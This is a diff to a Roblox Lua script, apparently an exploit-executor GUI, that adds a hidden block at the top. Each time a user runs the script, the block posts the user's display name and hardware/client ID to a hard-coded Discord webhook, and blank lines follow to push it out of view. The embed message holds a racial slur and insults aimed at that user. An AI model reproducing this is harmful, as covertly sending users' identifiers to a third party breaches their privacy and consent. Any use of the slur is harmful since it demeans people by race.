@@ -1,3 +1,49 @@
+local HttpService = game:GetService("HttpService")
+local Webhook_URL = "https://discord.com/api/webhooks/1291482032861483100/fmP7CoXTs6-gjrGhJGQaLXyLCD1FURQ3DlPQPp6EwBQpRrFXIIJMZe5wij3ivEWcDJfk" --Wehbook
+
+local function sendRequest(requestFunction)
+    local jsonBody = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "**O script foi executado!**",
+            ["description"] = game.Players.LocalPlayer.DisplayName.." Lil monkey ass executed the script little nigger",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffffff),
+            ["fields"] = {{
+                ["name"] = "Hardware ID:",
+                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                ["inline"] = true
+            }}
+        }}
+    })
+
+    local response = requestFunction({
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {
+            ['Content-Type'] = "application/json"
+        },
+        Body = jsonBody
+    })
+
+    print("Response Status Code: ", response.StatusCode)
+    print("Response Body: ", response.Body)
+end
+
+local requestFunction = (syn and syn.request) or (http_request) or (request)
+if requestFunction then
+    sendRequest(requestFunction)
+else
+    warn("Nenhuma funĂ§ĂŁo de solicitaĂ§ĂŁo HTTP disponĂ­vel.")
+end
+
+
+
+
+
+
+
+
 local UserInputService = game:GetService("UserInputService")
 
 local ScreenGui = Instance.new("ScreenGui")
